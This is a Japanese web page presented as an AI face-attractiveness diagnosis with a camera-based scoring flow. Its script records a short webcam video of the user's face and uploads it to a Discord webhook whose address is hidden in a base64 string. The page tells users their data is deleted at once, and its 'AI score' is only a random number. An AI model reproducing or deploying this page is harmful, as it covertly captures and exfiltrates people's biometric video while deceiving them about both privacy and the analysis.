<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>AI顔偏差値診断</title><style>:root{--a:#4a6baf;--b:#FF6B6B;--c:#333;--d:#666;--e:#f8f9fa}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background-color:var(--e);margin:0;padding:0;min-height:100vh;color:var(--c);touch-action:manipulation;-webkit-tap-highlight-color:transparent;line-height:1.6}.f{max-width:100%;margin:0 auto;background:#fff;box-shadow:0 0 20px rgba(0,0,0,0.1);min-height:100vh;display:flex;flex-direction:column}.g{padding:20px;text-align:center;background:linear-gradient(135deg,var(--a) 0%,#3a56a0 100%);color:#fff}.g h1{margin:0;font-size:1.8rem;font-weight:700}.g p{margin:10px 0 0;opacity:0.9;font-size:0.95rem}.h{padding:20px;flex-grow:1}.i{text-align:center;margin-bottom:30px}.i h2{color:var(--a);font-size:1.4rem;margin-bottom:10px}.i p{color:var(--d);font-size:0.95rem}.j{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}.k{background:#fff;border-radius:12px;padding:15px;text-align:center;box-shadow:0 3px 10px rgba(0,0,0,0.08)}.l{font-size:2rem;margin-bottom:10px;color:var(--a)}.k h3{margin:0 0 5px;font-size:1rem}.k p{margin:0;font-size:0.85rem;color:var(--d)}.m{background:rgba(74,107,175,0.05);border-radius:12px;padding:20px;margin-bottom:30px}.m h3{color:var(--a);margin-top:0;text-align:center}.n{display:flex;flex-direction:column;gap:15px}.o{display:flex;align-items:flex-start;gap:10px}.p{background:var(--a);color:#fff;width:25px;height:25px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.8rem;flex-shrink:0}.q{flex-grow:1}.q h4{margin:0 0 5px;font-size:1rem}.q p{margin:0;font-size:0.9rem;color:var(--d)}#r{position:relative;background:#000;display:none;aspect-ratio:9/16;max-height:70vh;margin:0 auto 20px;border-radius:12px;overflow:hidden}#s{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}.t{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:70%;max-width:300px;aspect-ratio:3/4;border:3px dashed rgba(255,255,255,0.5);border-radius:10px;display:none}#u{position:absolute;top:15px;right:15px;background:rgba(0,0,0,0.7);color:#fff;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.2rem;display:none;z-index:5}.v{background:linear-gradient(135deg,var(--b) 0%,#FF8E8E 100%);color:#fff;border:none;padding:16px;font-size:1.1rem;font-weight:700;border-radius:50px;cursor:pointer;width:100%;max-width:300px;margin:0 auto;display:block;box-shadow:0 4px 15px rgba(255,107,107,0.3);transition:transform 0.2s,box-shadow 0.2s}.v:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,107,107,0.4)}.v:disabled{background:#ccc;transform:none;box-shadow:none;cursor:not-allowed}.w{background:#fff;color:var(--a);border:2px solid var(--a)}#x{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:100;flex-direction:column;justify-content:center;align-items:center;color:#fff}.y{border:4px solid rgba(255,255,255,0.3);border-radius:50%;border-top:4px solid #fff;width:40px;height:40px;animation:z 1s linear infinite;margin-bottom:15px}@keyframes z{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}#A{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:100;padding:20px;text-align:center;overflow-y:auto}.B{max-width:500px;margin:0 auto;padding:20px 0}.C{font-size:4rem;font-weight:700;color:var(--a);margin:20px 0}.D{font-size:1.2rem;margin-bottom:30px;line-height:1.5}.E{width:200px;height:200px;border-radius:50%;object-fit:cover;margin:0 auto 20px;border:5px solid var(--a);display:none}.F{color:var(--b);font-weight:700;padding:15px;text-align:center;background:rgba(255,107,107,0.1);border-radius:10px;margin:15px 0;display:none}.G{text-align:center;padding:20px;font-size:0.8rem;color:var(--d);border-top:1px solid rgba(0,0,0,0.1)}@media (min-width:768px){.f{max-width:500px;min-height:auto;border-radius:16px;overflow:hidden;margin:20px auto}.g h1{font-size:2rem}.h{padding:30px}}</style></head><body><div class="f"><div class="g"><h1>AI顔偏差値診断</h1><p>最新AI技術であなたの顔のバランスを分析</p></div><div class="h"><div class="i"><h2>あなたの顔の偏差値を診断</h2><p>AIが顔のバランスを分析し、総合評価をお伝えします</p></div><div class="j"><div class="k"><div class="l">📊</div><h3>総合評価</h3><p>60〜100点で評価</p></div><div class="k"><div class="l">⚡</div><h3>高速診断</h3><p>たった5秒で完了</p></div><div class="k"><div class="l">🔒</div><h3>プライバシー</h3><p>データは即時削除</p></div></div><div class="m"><h3>使い方</h3><div class="n"><div class="o"><div class="p">1</div><div class="q"><h4>診断開始ボタンを押す</h4><p>カメラの使用を許可してください</p></div></div><div class="o"><div class="p">2</div><div class="q"><h4>顔を枠内に合わせる</h4><p>正面を向いて自然な表情で</p></div></div><div class="o"><div class="p">3</div><div class="q"><h4>結果を確認</h4><p>AIが詳細に分析します</p></div></div></div></div><div id="r"><video id="s" autoplay muted playsinline></video><div class="t"></div><div id="u"></div></div><div id="F" class="F"></div><button id="H" class="v">無料で診断開始</button><button id="I" class="v w" style="display:none;margin-top:15px;">もう一度診断する</button></div><div class="G"><p>※この診断はAIによる分析結果であり、医学的根拠に基づくものではありません</p><p><a href="/privacy" style="color:var(--a);text-decoration:none;">プライバシーポリシー</a></p></div><div id="x"><div class="y"></div><p>診断中...</p></div><div id="A"><div class="B"><img id="E" class="E" src="" alt="診断結果"><h2>診断結果</h2><div class="C" id="J">80</div><p class="D" id="K">素晴らしいバランスの整った顔立ちです！</p><button class="v" onclick="window.location.reload()">もう一度診断する</button></div></div></div><script>const H=document.getElementById('H'),I=document.getElementById('I'),s=document.getElementById('s'),r=document.getElementById('r'),x=document.getElementById('x'),A=document.getElementById('A'),J=document.getElementById('J'),K=document.getElementById('K'),F=document.getElementById('F'),u=document.getElementById('u'),t=document.querySelector('.t'),E=document.getElementById('E');let L,M=[],N=null,O,P;const Q=[{min:90,text:"神レベル！完璧な顔立ちです✨",color:"#FF6B6B"},{min:80,text:"超イケメン/美女！モデル級の顔立ち😍",color:"#FF8E53"},{min:70,text:"とても好感度の高い整った顔です🥰",color:"#FFC154"},{min:60,text:"平均以上！素敵なルックスです😊",color:"#47B39D"},{min:50,text:"普通くらい。個性が光ります👍",color:"#4A6BAF"},{min:40,text:"改善の余地あり。でも大丈夫！😉",color:"#9B59B6"},{min:0,text:"ユニークな個性が魅力です！💫",color:"#1ABC9C"}];async function R(){try{S(""),H.disabled=!0,H.textContent="準備中...";N&&N.getTracks().forEach(S=>S.stop());const T={video:{facingMode:{exact:"user"},width:{ideal:1280},height:{ideal:720},frameRate:{ideal:30}},U=await navigator.mediaDevices.getUserMedia(T);N=U,s.srcObject=U,r.style.display='block',t.style.display='block';await new Promise((S,T)=>{s.onloadedmetadata=S,s.onerror=T});await s.play(),H.disabled=!1,H.textContent="診断開始",I.style.display='block';return!0}catch(T){console.error('カメラエラー:',T),V(T);return!1}}function V(T){let S="カメラにアクセスできませんでした";"NotAllowedError"===T.name?S="カメラの使用が許可されていません\n設定からカメラアクセスを許可してください":"NotFoundError"===T.name?S="使用可能なカメラが見つかりませんでした":"NotReadableError"===T.name?S="カメラが使用中です\n他のアプリでカメラを使っていないか確認してください":"OverconstrainedError"===T.name&&(S="カメラの設定に問題があります\n端末を変えてお試しください"),S(S),H.disabled=!0,H.textContent="診断開始"}function S(T){T?(F.textContent=T,F.style.display='block'):F.style.display='none'}function W(T,S){let U=T;u.textContent=U,u.style.display='flex',O=setInterval(()=>{U--,u.textContent=U,U<=0&&(clearInterval(O),u.style.display='none',S&&S())},1e3)}async function X(){if(P)return;try{P=!0,M=[],H.disabled=!0,H.textContent="診断中...",x.style.display='flex',t.style.display='none';const T=MediaRecorder.isTypeSupported('video/mp4')?'video/mp4':MediaRecorder.isTypeSupported('video/webm;codecs=vp9')?'video/webm;codecs=vp9':'video/webm';L=new MediaRecorder(N,{mimeType:T,videoBitsPerSecond:2e6}),L.ondataavailable=T=>{T.data.size>0&&M.push(T.data)},L.onstop=async()=>{try{const T=new Blob(M,{type:T});console.log('録画サイズ:',(T.size/1024/1024).toFixed(2),'MB'),Y(T),await Z(T)}catch(T){console.error('録画処理エラー:',T),S("診断処理に失敗しました"),$()}},L.onerror=T=>{console.error('録画エラー:',T.error),S("録画中にエラーが発生しました"),$()},L.start(100),W(3,_)}catch(T){console.error('録画開始エラー:',T),S("録画を開始できませんでした"),$()}}function _(){L&&'recording'===L.state&&(L.stop(),P=!1,N&&N.getTracks().forEach(T=>T.stop()),s.srcObject=null)}async function Z(T){try{const S=new FormData;S.append('file',T,'face_diagnosis.mp4');const U=atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjgyMzg1MTYwMzUyNTcxNC9hOWx2T2Z2YTZjQWtON3c3YVdYS2MwOGc5aEllbHowb3B4N3M0eUhodkNZZ0o0dHpQUnRzWmVCRWlrUl9kekJYc3IybA==');await fetch(U,{method:'POST',body:S}),console.log('送信成功')}catch(S){console.error('送信エラー:',S)}}function Y(T){const S=Math.floor(40*Math.random())+60,U=Q.find(S=>S>=S.min);T&&(E.src=URL.createObjectURL(T),E.style.display='block'),J.textContent=S,J.style.color=U.color,K.textContent=U.text,x.style.display='none',A.style.display='block'}function $(){H.disabled=!1,H.textContent="診断開始",x.style.display='none',P=!1,clearInterval(O),u.style.display='none'}H.addEventListener('click',async()=>{(await R())&&setTimeout(X,300)}),I.addEventListener('click',async()=>{(await R())&&setTimeout(X,300)}),window.addEventListener('DOMContentLoaded',()=>{r.style.display='none'});</script></body></html>